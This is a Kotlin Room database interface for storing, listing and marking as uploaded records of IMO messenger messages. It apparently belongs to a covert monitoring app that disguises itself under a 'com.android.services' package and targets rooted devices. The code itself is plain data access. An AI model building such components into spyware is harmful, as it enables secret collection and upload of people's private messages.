package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.ImoRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface ImoRootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(ImoRooted: List<ImoRooted>)
    
    @Query("Select * from imo_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllIMOMessages(status: Int): List<ImoRooted>

    @Query("Update imo_rooted set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from imo_rooted")
    fun selectMaxTimeStamp(): Long?
}